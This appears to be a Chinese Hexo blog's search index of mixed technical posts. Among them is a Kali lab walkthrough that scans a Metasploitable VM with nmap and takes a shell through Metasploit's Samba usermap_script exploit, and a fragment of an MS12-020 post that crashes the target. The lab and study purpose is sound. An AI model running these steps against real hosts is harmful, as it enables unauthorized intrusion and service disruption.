src="/2018/12/26/ms12-020渗透攻击实战/exploit.png" alt="Alt text"></p></li><li><p>迅速切换到靶机界面，可以看到靶机界面显示蓝屏，然后自动重启。<br><img src="/2018/12/26/ms12-020渗透攻击实战/shutdown.png" alt="Alt text"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>git 常用命令操作</title>
      <link href="/2018/12/10/git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"/>
      <url>/2018/12/10/git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>  公司项目开发中经常使用git进行代码管理，记录常用问题以及遇到问题的解决方法。目前写下只是一部分印象较深的，以后会根据项目中遇到的问题进行解决并更新记录。<br><a id="more"></a></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol><li><p>平时代码上传拉取远程仓库并上传到远程仓库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -am &quot;message&quot;</span><br><span class="line">git pull</span><br><span class="line">git push origin branchName</span><br></pre></td></tr></table></figure></li><li><p>检查分支状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li><li><p>分支切换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout branchName</span><br></pre></td></tr></table></figure></li><li><p>撤销commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git reset --hard ^HEAD</span><br></pre></td></tr></table></figure></li><li><p>返回到相应的提交位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h2 id="一般操作"><a href="#一般操作" class="headerlink" title="一般操作"></a>一般操作</h2><ol><li>在新的环境下新建本地仓库并拉取远程。<br>进入项目复制该项目的SSH路径,使用git bash或者cmd进入到改项目路径。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git@...</span><br><span class="line">git add .</span><br><span class="line">git commit -am &quot;first commit&quot;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>kali 渗透攻击Samba服务</title>
      <link href="/2018/11/27/kali-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BBSamba%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2018/11/27/kali-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BBSamba%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>  公司网站开发需要测试一下教学网站中的实验部分（一人两台实验机器，其中一台为kali，另一台为metasploitable）,看一下是否能正常使用。对kali工具不熟悉，找了几篇博客，并将主要流程记录下来。<br><a id="more"></a></p><p>使用postman发送请求，将两台虚拟机镜像的ID封装成json对象。后端接收到数据后，生成对应的虚拟机，打开openstack的dashboard可以看到生成两个虚拟机，信息如下(主要看主机名和IP)：<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/实例信息.png" alt=""><br>后台返回kali的url。将url复制到浏览器中后开始操作。</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>nmap是一款专用的端口扫描工具，主要使用该工具发现局域网中的主机，和主机开放的端口。</p><ul><li>主机扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 172.0.0.0-100</span><br></pre></td></tr></table></figure></li></ul><p>该命令是扫描发现局域网下IP为172.0.0.0-172.0.0.100下可以ping通的IP,结果如下。<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/主机扫描.png" alt=""><br>由图片可知，已经发现了IP为172.0.0.13的虚拟机。</p><ul><li>端口扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 172.0.0.13 -A</span><br></pre></td></tr></table></figure></li></ul><p>该命令是发现主机开发的端口，通过扫描可以发现该主机开放了一些存在高危漏洞的端口。<br><img src="/2018/11/27/kali-渗透攻击Samba服务器/端口扫描.png" alt=""><br>上图所示是该主机开放的所有端口，其中知道比较多的139、445等高危端口是开放的。</p><ul><li>渗透攻击Samba服务<br>Samba服务对应的端口有139和445等，只要开启这些端口后，主机就有可能存在Samba远程溢出漏洞。以下是攻击步骤：</li></ul><ol><li><p>启动MSF终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>使用smb_version模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/samba/usermap_script</span><br></pre></td></tr></table></figure></li><li><p>设置RHOST选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 172.0.0.13</span><br></pre></td></tr></table></figure></li><li><p>启动渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>等待完成，如果成功。使用Linux命令查询主机相关信息。例如查询系统当前用户和ip地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ip address</span><br></pre></td></tr></table></figure></li></ol><p><img src="/2018/11/27/kali-渗透攻击Samba服务器/渗透攻击.png" alt=""><br>这只是其中的一种漏洞，因为metasploitable是一个人工靶机，所以教程较多，攻击流畅。下面这篇博客里面还包含了其他的一些漏洞和攻击方法，可以参考。<br>参考链接：<a href="https://www.cnblogs.com/student-programmer/p/6728594.html" target="_blank" rel="noopener">Kali-Linux渗透攻击应用</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Hexo 博客迁移</title>
      <link href="/2018/11/25/hexo-%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
      <url>/2018/11/25/hexo-%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo-博客迁移管理"><a href="#Hexo-博客迁移管理" class="headerlink" title="Hexo 博客迁移管理"></a>Hexo 博客迁移管理</h2><p>在公司电脑上部署后，博客只能在公司编辑，总有一点不方便。查找了一些资料，如何把博客迁移到自己的笔记本中。主要有两种方法，一个是新建仓库来放环境文件，另一个是通过分支进行管理。本文采用的是通过分支进行管理。现在记录下该过程，方便以后有需要的时候即时查看。<strong>本文只记录迁移的过程</strong></p><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>github上已经搭建好相关仓库。</li></ol><h3 id="原电脑的操作步骤"><a href="#原电脑的操作步骤" class="headerlink" title="原电脑的操作步骤"></a>原电脑的操作步骤</h3><ol><li><p>新建分支dev，该分支用来存储静待文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b  dev</span><br></pre></td></tr></table></figure></li><li><p>将github 上的仓库下载到本地,删除这个文件夹所有的除了.git文件外的所有文件。</p></li><li>将工作区的变化提交（包括删除文件）。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add -A</span><br><span class="line">git commit -m &quot;message&quot;</span><br><span class="line">git push origin dev</span><br></pre></td></tr></table></figure></li></ol><p>4.复制.git文件到项目的根目录下。删除clone下来的文件夹。</p><h3 id="新电脑上环境搭建"><a href="#新电脑上环境搭建" class="headerlink" title="新电脑上环境搭建"></a>新电脑上环境搭建</h3><ol><li>安装node.js和git</li><li><p>安装hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></li><li><p>下载仓库到本地</p></li><li><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure></li><li><p>进入到themes下，下载主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next</span><br></pre></td></tr></table></figure></li></ol><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><p>完成以上工作后，两台电脑就可以通过git命令同步。<br>目前流程可能有不完善的地方，以后碰到会对文章做出修改。</p><p><strong>参考</strong>：<a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HTTP/HTTPS 学习笔记（一）</title>
      <link href="/2018/11/22/HTTP-HTTPS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2018/11/22/HTTP-HTTPS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><a id="more"></a><h3 id="HTTP请求准备"><a href="#HTTP请求准备" class="headerlink" title="HTTP请求准备"></a>HTTP请求准备</h3><ul><li>浏览器将域名发送给DNS服务器，服务器将域名解析为IP地址。</li><li>建立TCP连接。<h3 id="HTTP构建"><a href="#HTTP构建" class="headerlink" title="HTTP构建"></a>HTTP构建</h3></li><li>浏览器发送HTTP请求。请求格式如下<br><img src="/2018/11/22/HTTP-HTTPS-学习笔记（一）/Http构建.jpg" alt=""><br>一共有三个部分，分别是<strong>请求行</strong>，<strong>首部字段</strong>，<strong>正文实体</strong>。<h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4></li><li><strong>方法</strong>：POST,PUT,GET,DELETE….</li><li><strong>URL</strong>：</li><li><strong>版本</strong>：协议版本<h4 id="首部"><a href="#首部" class="headerlink" title="首部"></a>首部</h4>首部是通过key value的方式存储重要的字段。以下举例说明</li><li>Accept-Charset：客户端可以接受的字符集，防止服务器传过来另外的字符集，导致乱码。</li><li>Content-Type：正文的格式。</li></ul><p>高并发场景下的系统，在真正的业务逻辑前需要接入层，拦截静态资源请求。如下<br><img src="/2018/11/22/HTTP-HTTPS-学习笔记（一）/缓存拦截.jpg" alt=""></p><ul><li>Cache-control : 控制缓存</li></ul><p>通过max-age指令判断客户端是接受缓存层的资源还是经请求转发给应用集群。详细关于HTTP的缓存控制可以看一下这篇博客。<a href="http://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">HTTP缓存控制</a></p><h3 id="HTTP请求发送"><a href="#HTTP请求发送" class="headerlink" title="HTTP请求发送"></a>HTTP请求发送</h3><p>HTTP协议是基于TCP协议的，使用的是面向连接的方式发送请求。其发送的和路由转发原理一样。</p><h3 id="HTTP返回的构建"><a href="#HTTP返回的构建" class="headerlink" title="HTTP返回的构建"></a>HTTP返回的构建</h3><p>和HTTP构建相似<br><img src="/2018/11/22/HTTP-HTTPS-学习笔记（一）/Http返回的构建.jpg" alt=""></p><h3 id="HTTP2-0"><a href="#HTTP2-0" class="headerlink" title="HTTP2.0"></a>HTTP2.0</h3><p>优化</p><ul><li>压缩HTTP头，在每次需要携带大量key value的两端建立一个索引表，相同的头只发送索引表中的索引。</li><li>可以将多个请求分到不同的流中，然后将请求内容拆成帧，进行二进制传输。</li></ul><h3 id="QUIC协议"><a href="#QUIC协议" class="headerlink" title="QUIC协议"></a>QUIC协议</h3><p>HTTP协议是基于TCP协议的，在处理包时有严格的顺序。会导致当一个包没有接受到时，必须等待包传输完成才可以进行。</p><ul><li>自定义连接机制</li><li>自定义重传机制</li><li>无阻塞多路复用</li><li>自定义流量控制<br>关于QUIC的详细介绍请看这篇博客：<a href="https://zhuanlan.zhihu.com/p/32553477" target="_blank" rel="noopener">QUIC介绍</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>二叉树基本总结</title>
      <link href="/2018/11/21/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%9F%BA%E6%9C%AC%E6%80%BB%E7%BB%93/"/>
      <url>/2018/11/21/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%9F%BA%E6%9C%AC%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>整理极客时间《数据结构和算法之美》内容，加深自己印象。后期通刷题对应相应的知识点部分。<br><a id="more"></a></p><h2 id="二叉树基础"><a href="#二叉树基础" class="headerlink" title="二叉树基础"></a>二叉树基础</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>节点（父节点、子节点、兄弟节点、根节点、叶子节点）</li><li>树的定义（完全二叉树、满二叉树）</li><li>高度、深度、层数</li></ol><h3 id="常见知识点"><a href="#常见知识点" class="headerlink" title="常见知识点"></a>常见知识点</h3><h5 id="1-如何存储一棵二叉树"><a href="#1-如何存储一棵二叉树" class="headerlink" title="1.如何存储一棵二叉树"></a>1.如何存储一棵二叉树</h5><ol><li>基于指针或者引用二叉链式存储法</li><li>基于数组的顺序存储法</li></ol><p><strong>链式存储法</strong><br>每个节点有三个字段，一个用来存储数据，另外两个分别是指向左右子节点的指针</p><p><strong>顺序存储法</strong><br>如果节点X存储在数组中下标为i的位置，下标为2i的位置存储的就是左子节点。如果2i+1的位置就是右子节点。反过来i/2就是其根节点。</p><blockquote><p>完全二叉树要求最后一层的子节点全部靠左是因为这样用数组存储节省内存，不需要像链式存储使用额外的存储空间。</p></blockquote><h5 id="2-二叉树的遍历"><a href="#2-二叉树的遍历" class="headerlink" title="2.二叉树的遍历"></a>2.二叉树的遍历</h5><ol><li>前序遍历</li><li>中序遍历</li><li>后续遍历</li><li>按层遍历（少见）</li></ol><h5 id="3-二叉查找树"><a href="#3-二叉查找树" class="headerlink" title="3.二叉查找树"></a>3.二叉查找树</h5><ol><li>二叉查找树的查找</li><li>二叉查找树的插入</li><li>二叉查找树的删除</li><li>二叉查找树查找最大节点和最小节点</li><li>二叉查找树查找前驱节点和后继节点</li></ol><blockquote><p>中序遍历的二叉树可以输出有序的数据序列，时间复杂度是O(n)</p></blockquote><h5 id="4-支持重度数据的二叉查找树"><a href="#4-支持重度数据的二叉查找树" class="headerlink" title="4.支持重度数据的二叉查找树"></a>4.支持重度数据的二叉查找树</h5><ol><li>每一个节点上不止同时存储一个数据。通过链表和动态扩容的数组等数据结构，把值相同的数据存储在同一个节点上。</li><li>在查找插入位置的过程中，如果碰到相同的数据，则交给二叉查找树的右节点当做一个新的数处理。查找的时候停止条件为遇到叶子节点。</li></ol><blockquote><p><strong>时间复杂度</strong>：O(log(n))</p></blockquote><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h5 id="如何求出一个二叉树的高度"><a href="#如何求出一个二叉树的高度" class="headerlink" title="如何求出一个二叉树的高度"></a>如何求出一个二叉树的高度</h5><ol><li>深度优先思想的递归，分别求左右子树的高度。当前节点的高度就是左右子树中较大的那个+1；</li><li>可以采用层次遍历的方式，每一层记录都记录下当前队列的长度，这个是队尾，每一层队头从0开始。然后每遍历一个元素，队头下标+1。直到队头下标等于队尾下标。这个时候表示当前层遍历完成。每一层刚开始遍历的时候，树的高度+1。最后队列为空，就能得到树的高度。</li></ol><h5 id="散列表的插入、删除、查找的时间复杂度O-1-。为什么要用二叉树？"><a href="#散列表的插入、删除、查找的时间复杂度O-1-。为什么要用二叉树？" class="headerlink" title="散列表的插入、删除、查找的时间复杂度O(1)。为什么要用二叉树？"></a>散列表的插入、删除、查找的时间复杂度O(1)。为什么要用二叉树？</h5><ol><li>散列表是无序的，而对于二叉查找树，只要中序遍历即可。</li><li>散列表扩容耗时多，当遇到散列冲突时，性能不稳定。虽然二叉查找树的性能不稳定，但是平衡二叉树性能稳定。</li><li>因哈希冲突的存在，常量的复杂度有可能比logn大。所以在实际应用中，速度并不一定会比平衡二叉树快。</li><li>散列表构造复杂：散列函数设计，冲突解决办法，扩容，缩容等。平衡二叉树只需要考虑平衡性这个问题，且该问题的解决方案成熟，固定。</li><li>为了避免过多的散列冲突，散列表装载因子不能太大，特别是基于开放寻址法解决冲突的散列表，不然会浪费一定的存储空间。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>java时间戳</title>
      <link href="/2018/11/21/java%E6%97%B6%E9%97%B4%E6%88%B3/"/>
      <url>/2018/11/21/java%E6%97%B6%E9%97%B4%E6%88%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="java时间戳"><a href="#java时间戳" class="headerlink" title="java时间戳"></a>java时间戳</h3><a id="more"></a><hr><h4 id="获取当前时间戳"><a href="#获取当前时间戳" class="headerlink" title="获取当前时间戳"></a>获取当前时间戳</h4><p>一共三种方法</p><ul><li>System.currentTimeMillis();  </li><li>Calendar.getInstance().getTimeInMillis()；</li><li>new Date().getTime()；</li></ul><h4 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h4><blockquote><p>SimpleDateFormat df = new SimpleDateFormat(“yyyy-MM-dd HH:mm:ss”);//设置日期格式<br>String date = df.format(new Date());// new Date()为获取当前系统时间，也可使用当前时间戳</p></blockquote><p>仿照博客进行了时间测试。分别测试一次，时间差别不大。查看博客上的测试都是测试十万次。这样测得的数据才具有代表性。<br><a href="https://blog.csdn.net/qq_15037231/article/details/78224321" target="_blank" rel="noopener">参考博客</a></p>]]></content>
      
      
      <categories>
          
          <category> java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常用工具集</title>
      <link href="/2018/11/17/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
      <url>/2018/11/17/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>平时在学习中经常用到的方便快捷的小工具，总结一下并附上简单说明和下载链接。</p><a id="more"></a><hr><h2 id="常用工具-1"><a href="#常用工具-1" class="headerlink" title="常用工具"></a>常用工具</h2><p>平时在学习中经常用到的方便快捷的小工具，总结一下并附上简单说明和下载链接。</p><h3 id="terminus"><a href="#terminus" class="headerlink" title="terminus"></a>terminus</h3><ul><li>一款非常好用的远程连接工具。目前支持的windows、Android、ios、linux。<br><a href="https://www.termius.com/" target="_blank" rel="noopener">下载链接</a></li></ul><h3 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h3><ul><li>后端开发中，测试接口返回信息的工具。<br><a href="https://www.getpostman.com/apps" target="_blank" rel="noopener">下载链接</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>测试工具Junit</title>
      <link href="/2018/11/04/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7Junit/"/>
      <url>/2018/11/04/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7Junit/</url>
      
        <content type="html"><![CDATA[<h1 id="Junit使用"><a href="#Junit使用" class="headerlink" title="Junit使用"></a>Junit使用</h1><a id="more"></a><hr><h2 id="Junit-简介"><a href="#Junit-简介" class="headerlink" title="Junit 简介"></a>Junit 简介</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>JUnit是一个Java语言的单元测试框架。它由Kent Beck和Erich Gamma建立，逐渐成为源于Kent Beck的sUnit的xUnit家族中最为成功的一个JUnit有它自己的JUnit扩展生态圈。多数Java的开发环境都已经集成了JUnit作为单元测试的工具。</li></ul><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>JUnit是用于编写和运行测试的开源框架。</li><li>提供了注释，以确定测试方法。</li><li>提供断言测试预期结果。</li><li>提供了测试运行的运行测试。</li><li>JUnit测试让您可以更快地编写代码，提高质量 JUnit是优雅简洁。</li><li>它是不那么复杂以及不需要花费太多的时间。</li><li>JUnit测试可以自动运行，检查自己的结果，并提供即时反馈。没有必要通过测试结果报告来手动梳理。</li><li>JUnit测试可以组织成测试套件包含测试案例，甚至其他测试套件。</li><li>Junit显示测试进度的，如果测试是没有问题条形是绿色的，测试失败则会变成红色。</li></ul><h2 id="Junit-安装使用"><a href="#Junit-安装使用" class="headerlink" title="Junit 安装使用"></a>Junit 安装使用</h2><ol><li>笔者使用的是<strong>Intellij IDEA</strong>编辑器，该软件在安装时已经默认配置了Junit单元测试插件，读者可以尝试在<strong>“File-&gt;Settings-&gt;Plugins”</strong>下搜索JUnit，如果没有请自行安装。安装好应用后重启编辑器即可。</li><li>在工程目录下创建test目录用于存放测试类，在此目录上右击鼠标并将此目录标记为Test Resources Root。</li><li>选择需要测试的类文件，右键点击选择<strong>go to -&gt;test</strong>,然后点击create new test <img src="/2018/11/04/测试工具Junit/Junit_1.jpg" alt=""></li><li>选择必要的选项，然后选择需要测试的方法，添加完成后即可生成测试方法。<img src="/2018/11/04/测试工具Junit/Junit_2.png" alt=""></li><li>在测试方法中添加具体的实现内容后，即可执行相应的测试内容。<img src="/2018/11/04/测试工具Junit/Junit_3.png" alt=""></li></ol><h3 id="常用的注解"><a href="#常用的注解" class="headerlink" title="常用的注解"></a>常用的注解</h3><ol><li>@Test: 测试方法<br>　　　　a)(expected=XXException.class)如果程序的异常和XXException.class一样，则测试通过<br>　　　　b)(timeout=100)如果程序的执行能在100毫秒之内完成，则测试通过</li><li>@Ignore: 被忽略的测试方法：加上之后，暂时不运行此段代码</li><li>@Before: 每一个测试方法之前运行</li><li>@After: 每一个测试方法之后运行</li><li>@BeforeClass: 方法必须必须要是静态方法（static 声明），所有测试开始之前运行，注意区分before，是所有测试方法</li><li>@AfterClass: 方法必须要是静态方法（static 声明），所有测试结束之后运行，注意区分 @After</li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
